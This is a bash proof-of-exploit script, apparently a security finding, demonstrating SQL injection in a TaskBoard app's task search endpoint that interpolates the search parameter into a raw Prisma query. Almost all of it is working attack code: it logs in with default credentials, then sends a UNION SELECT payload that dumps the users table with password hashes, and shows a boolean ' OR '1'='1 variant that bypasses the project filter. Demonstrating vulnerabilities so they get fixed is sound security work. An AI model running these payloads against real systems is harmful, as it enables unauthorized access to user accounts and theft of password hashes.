#!/usr/bin/env bash
#
# PROOF OF EXPLOIT — SQL Injection in TaskBoard task search
# ----------------------------------------------------------
# Vulnerable code: src/app/api/projects/[id]/tasks/route.ts:27-34
#   The `q` search param is string-interpolated straight into a
#   prisma.$queryRawUnsafe(...) call — no escaping, no binding.
#
# This script proves that ANY authenticated user can break out of the
# intended query and dump the entire `users` table (including bcrypt
# password hashes) through the task search endpoint.
#
# Usage:
#   ./sql-injection-proof.sh                 # uses defaults below
#   BASE_URL=http://localhost:3000 ./sql-injection-proof.sh
#
set -euo pipefail

BASE_URL="${BASE_URL:-http://localhost:3000}"
EMAIL="${EMAIL:-meera@taskboard.dev}"
PASSWORD="${PASSWORD:-password123}"

echo "==> 1. Log in as a normal user to obtain a JWT"
TOKEN=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
echo "    token acquired."

echo "==> 2. Find a project the user can access (any project works)"
PID=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/projects" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['projects'][0]['id'])")
echo "    project id: $PID"

echo "==> 3. Inject a UNION SELECT through the ?q= search param to dump users"
echo "        Injected payload:"
echo "        zzzz') UNION SELECT id, 'LEAK', name, password_hash, 'todo'::\"TaskStatus\", NULL, id, 0, created_at, updated_at FROM users -- "
echo
echo "==> RAW curl request:"
echo "    curl -s -G -H \"Authorization: Bearer \$TOKEN\" \\"
echo "      --data-urlencode \"q=zzzz') UNION SELECT id, 'LEAK', name, password_hash, 'todo'::\\\"TaskStatus\\\", NULL, id, 0, created_at, updated_at FROM users -- \" \\"
echo "      \"$BASE_URL/api/projects/\$PID/tasks\""
echo
echo "==> Response (each 'task' is actually a real user; password hash lands in 'description'):"
curl -s -G -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=zzzz') UNION SELECT id, 'LEAK', name, password_hash, 'todo'::\"TaskStatus\", NULL, id, 0, created_at, updated_at FROM users -- " \
  "$BASE_URL/api/projects/$PID/tasks" | python3 -m json.tool

echo
echo "==> Bonus: boolean-based variant (returns ALL tasks, bypassing the project filter):"
echo "    curl -s -G -H \"Authorization: Bearer \$TOKEN\" --data-urlencode \"q=' OR '1'='1\" \"$BASE_URL/api/projects/\$PID/tasks\""
